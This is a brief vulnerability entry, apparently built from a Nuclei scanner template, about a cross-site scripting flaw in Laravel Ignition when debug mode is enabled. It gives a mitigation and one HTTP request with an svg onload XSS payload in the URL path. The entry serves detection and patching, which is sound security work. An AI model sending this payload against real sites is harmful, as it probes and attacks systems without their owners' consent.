# Vulnerability: Laravel Ignition - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`laravel-ignition-xss.yaml`)

## Description
Laravel Ignition contains a cross-site scripting vulnerability when debug mode is enabled.

## Secure Mitigation
Disable debug mode by setting APP_DEBUG to false.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>
```

